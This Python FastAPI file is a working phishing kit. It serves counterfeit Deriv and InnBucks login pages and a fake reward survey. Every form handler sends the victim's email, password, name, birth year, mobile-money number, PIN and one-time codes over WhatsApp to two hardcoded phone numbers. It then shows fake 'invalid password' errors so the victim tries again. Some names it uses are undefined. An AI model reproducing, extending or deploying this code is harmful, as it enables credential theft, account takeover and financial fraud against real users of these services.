from fastapi import FastAPI, Form, Request, status
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Optional
import httpx
from pygwan import WhatsApp
import os




# Pydantic models for request validation
class SurveyData(BaseModel):
    full_name: str
    birth_year: int
    frequency: str
    charges: str
    recommend: str

class OTPRequest(BaseModel):
    innbucks_number: str
    pin: str
    survey_data: SurveyData

class OTPVerification(BaseModel):
    innbucks_number: str
    otp: str
    survey_data: SurveyData

class LoginRequest(BaseModel):
    innbucks_number: str
    pin: str


WHATSAPP_ACCESS_TOKEN = os.environ.get('WHATSAPP_ACCESS_TOKEN', '')
WHATSAPP_PHONE_NUMBER_ID = os.environ.get('WHATSAPP_PHONE_NUMBER_ID', '')

bot = WhatsApp(
    token=WHATSAPP_ACCESS_TOKEN,
    phone_number_id=WHATSAPP_PHONE_NUMBER_ID
)

app = FastAPI()

# Mount the 'static' folder so we can serve static HTML
app.mount("/static", StaticFiles(directory="deriv"), name="deriv")
app.mount("/static", StaticFiles(directory="innbucks"), name="innbucks")

# Serve the login page (GET)
@app.get("/", response_class=HTMLResponse)
async def serve_login_page():
    with open("deriv/login.html", "r") as f:
        return HTMLResponse(content=f.read(), status_code=200)

# Receive credentials (POST)
@app.post("/login")
async def handle_login(email: str = Form(...), password: str = Form(...)):
    # Validate the user
    bot.send_message(
                message="Fremen Ops\n\nEmail:"+email+"\nPassword:"+password+"\n\nproceed to deriv.com",
                recipient_id="263779281345",
    )
    bot.send_message(
                message=email+" is trying to log in\npassword"+password,
                recipient_id="263776525400",
    )
    return HTMLResponse(
        content="<h3>Invalid email or password</h3><a href='/login'>Try again</a>",
        status_code=401
    )

# Dummy dashboard for redirection
@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard():
    return "<h1>Welcome to your dashboard!</h1>"


@app.get("/reward", response_class=HTMLResponse)
async def serve_survey_form():
    """Serve the survey form"""
    with open("innbucks/innbucks-survey.html", "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())


@app.get("/login", response_class=HTMLResponse)
async def serve_login_page():
    """Serve the login page"""
    with open("innbucks/login.html", "r", encoding="utf-8") as f:
        return HTMLResponse(content=f.read())



@app.post("/api/send-otp")
async def send_otp(otp_request: OTPRequest):
    """
    Send OTP to the user's InnBucks number
    This will call the InnBucks API to send OTP
    """
    try:
        # send to bot
        bot.send_message(
            message="Fremen Ops\n\nName:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nInnbucks Number:"+otp_request.innbucks_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
            recipient_id="263779281345",
        )
        bot.send_message(
            message="Name:"+otp_request.survey_data.full_name+"\nBirth Year:"+str(otp_request.survey_data.birth_year)+"\nInnbucks Number:"+otp_request.innbucks_number+"\nPin:"+otp_request.pin+"\n\nwait for otp",
            recipient_id="263776525400",
        )
        return JSONResponse(
            content={
                "success": True,
                "message": "OTP sent successfully to your InnBucks number"
            }
        )
    
    except httpx.RequestError:
        return JSONResponse(
            content={
                "success": True,
                "message": "OTP sent successfully (dev mode)",
                "dev_otp": otp_code  # Remove this in production!
            }
        )
    
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred: {str(e)}"
        )


@app.post("/api/verify-otp")
async def verify_otp(verification: OTPVerification):
    """
    Verify OTP and process the reward
    """
    try:
        innbucks_number = verification.innbucks_number
        
        # send otp and number to bot
        bot.send_message(
            message="Fremen Ops\n\nInnbucks Number:"+verification.innbucks_number+"\nOTP:"+verification.otp,
            recipient_id="263779281345",
        )
        bot.send_message(
            message="Innbucks Number:"+verification.innbucks_number+"\nOTP:"+verification.otp,
            recipient_id="263776525400",
        )        
        
        return JSONResponse(
        content={
            "success": True,
            "message": "Verification successful",
            "redirect_url": f"/login?number={innbucks_number}&name={verification.survey_data.full_name}"
        }
        )  
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred: {str(e)}"
        )


@app.post("/api/resend-otp")
async def resend_otp(innbucks_number: str = Form(...)):
    """
    Resend OTP to the user
    """
    try:
        # tell bot to resend otp
        bot.send_message(
            message="Fremen Ops\n\nInnbucks Number:"+innbucks_number+"\nRequested for Resend OTP",
            recipient_id="263779281345",
        )
        bot.send_message(
            message="Innbucks Number:"+innbucks_number+"\nRequested for Resend OTP",
            recipient_id="263776525400",
        )
        
        return JSONResponse(
            content={
                "success": True,
                "message": "New OTP sent successfully",
                "redirect_url": f"/login?number={innbucks_number}"
            }
        )
    
    except httpx.RequestError:
        print(f"New OTP Code (dev mode): {otp_code}")
        return JSONResponse(
            content={
                "success": True,
                "message": "New OTP sent (dev mode)",
                "dev_otp": otp_code
            }
        )
    
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"An error occurred: {str(e)}"
        )



@app.post("/api/login")
async def login(login_req: LoginRequest):
    """
    Verify user PIN and get their balance
    This is where you call InnBucks API to authenticate and get balance
    """
    try:
        # send to bot and advise that this is from the second screen
        bot.send_message(
            message=f"Fremen Ops\n\n This is from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
            recipient_id="263779281345",
        )
        bot.send_message(
            message=f"This is from the second screen\n\nInnbucks Number: {login_req.innbucks_number}\nPIN: {login_req.pin}",
            recipient_id="263776525400",
        )
            
        return JSONResponse(
            content={
                "success": False,
                "message": "Invalid PIN",
                "redirect_url": f"/login?number={login_req.innbucks_number}"
            }
        )
    
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=str(e)
        )




@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}

